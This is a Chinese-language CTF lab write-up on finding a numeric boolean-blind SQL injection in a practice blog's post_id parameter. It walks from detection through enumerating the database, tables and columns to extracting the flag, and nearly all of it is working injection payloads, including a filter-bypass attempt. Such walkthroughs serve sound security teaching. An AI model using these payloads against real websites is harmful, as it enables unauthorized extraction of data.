---
title: 好靶场SQLi-某博客存在SQL注入
published: 2026-09-19T17:00:00
description: 博客 POST 搜索无注入，在 post_id 找到数字型布尔盲注点，完整记录从探测到爆破获取 flag 的实战流程。
tags:
  - 靶场
  - SQL注入
category: 网络安全
draft: false
---

## 探测注入点

在打开之后，只有一个搜索框是有数据交互的，其他页面皆为静态

于是在搜索框尝试了几种注入方法，查看网络数据包发现可能存在点不在此处

因为是POST方法，抓包看一下详细数据包是什么样，又尝试了发现还是不行

```
------WebKitFormBoundary71yxeg9mKNeSUpFO
Content-Disposition: form-data; name="action"

search
------WebKitFormBoundary71yxeg9mKNeSUpFO
Content-Disposition: form-data; name="keyword"

文件上传" /**/anandd/**/1=1/**/--/**/-
------WebKitFormBoundary71yxeg9mKNeSUpFO--
```

这时，随便抓了一个文章详情的页面，发现有id，尝试数字型注入，果然存在注入点

```
Content-Disposition: form-data; name="post_id"
4 and 1=1 -- -
4 and 1=2 -- -
```

## 布尔盲注

### 验证数据库类型

```
// mysql
and length(database())>0

// postgresql
4 and length(current_database())>0
```

### 当前数据库位数

```
// 结果为3，应该是web
4 and length(database())=$1$
```

### 当前数据库名

```
// 119+101+98，果然是web
4 and ascii(substr(database(),$1$,1))=$1$
```

### 探测表数量

```
// 共4张表，因为是靶场，所以后续直接找长度为4的数据表
4 and (select count(*) from information_schema.tables where table_schema='web')=$1$
```

### 探测表名长度

```
// 第一个表是8位，第二个10位，第三个5位，第四个4位
4 and length((select table_name from information_schema.tables where table_schema='web' limit 0,1))=$1$
```

### 探测表名

```
// 102+108+97+103 表名就是flag
4 and ascii(substr((select table_name from information_schema.tables where table_schema='web' limit 3,1),$1$,1))=$1$
```

### 直接看第二个字段是什么

```
// 102+108+97+103 不用多说，其实应该先跑位数
4 and ascii(substr((select column_name from information_schema.columns where table_schema='web' and table_name='flag' limit 1,1),$1$,1))=$1$

// 这里补一下跑第二个字段位数payload
4 and length((select column_name from information_schema.columns where table_name='flag' limit 1,1))=$1$
```

### 最后结果

```
// 以防万一，还得先看一眼行数，结果是1行
4 and (select count(*) from flag)=$1$

// 看一下flag字段的长度，结果为38
4 and length((select flag from flag limit 0,1))=$1$

// 偷懒直接设置变量从6-37位 最终结果：flag{f3d7ca4f0683446c850afefc3bc9717f}
4 and ascii(substr((select flag from flag limit 0,1),1,1))=1
```
